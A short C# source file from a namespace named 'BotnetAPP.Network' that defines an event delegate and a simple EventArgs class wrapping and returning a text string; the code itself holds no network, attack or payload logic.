using System ;

namespace BotnetAPP.Network {

    public delegate void EventConnectionHandler(object source, EventConnection e);

    public class EventConnection : EventArgs {
        private string EventInfo;
        public EventConnection(string Text)
        {
            EventInfo = Text;
        }
        public string GetInfo()
        {
            return EventInfo;
        }

    }
}